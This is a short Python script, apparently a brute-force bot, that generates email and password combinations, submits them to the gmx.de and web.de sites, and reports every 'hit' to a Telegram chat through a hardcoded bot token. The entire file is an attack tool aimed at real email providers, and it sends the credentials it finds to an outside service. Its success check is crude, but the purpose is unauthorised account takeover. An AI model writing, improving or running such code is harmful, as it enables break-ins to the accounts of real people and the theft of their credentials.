 import telegram
import requests
import itertools
import string
import time
import threading

# Telegram Bot Token
TELEGRAM_BOT_TOKEN = '8906211066:AAFvWPYroYUoU8HqZlTfJxBZQKhBhcsbvcw'

# Initialize Telegram Bot
bot = telegram.Bot(token=TELEGRAM_BOT_TOKEN)

# Function to generate email-password combinations
def generate_combinations():
    characters = string.ascii_lowercase + string.digits
    for combination in itertools.product(characters, repeat=10):
        email = ''.join(combination) + '@gmx.de'
        password = ''.join(combination)
        yield email, password

# Function to check if email-password combination is valid
def check_combination(email, password, domain):
    url = f'https://{domain}/'
    payload = {
        'email': email,
        'password': password
    }
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    response = requests.post(url, data=payload, headers=headers)
    return response.status_code == 200

# Function to send message to Telegram
def send_telegram_message(message):
    bot.send_message(chat_id='YOUR_TELEGRAM_CHAT_ID', text=message)

# Main function to run the bot
def main():
    combination_generator = generate_combinations()
    domains = ['gmx.de', 'web.de']

    while True:
        for _ in range(10000):
            try:
                email, password = next(combination_generator)
                for domain in domains:
                    if check_combination(email, password, domain):
                        send_telegram_message(f'Hit! Email: {email}, Password: {password}, Domain: {domain}')
            except StopIteration:
                break
        time.sleep(10)

if __name__ == '__main__':
    main()
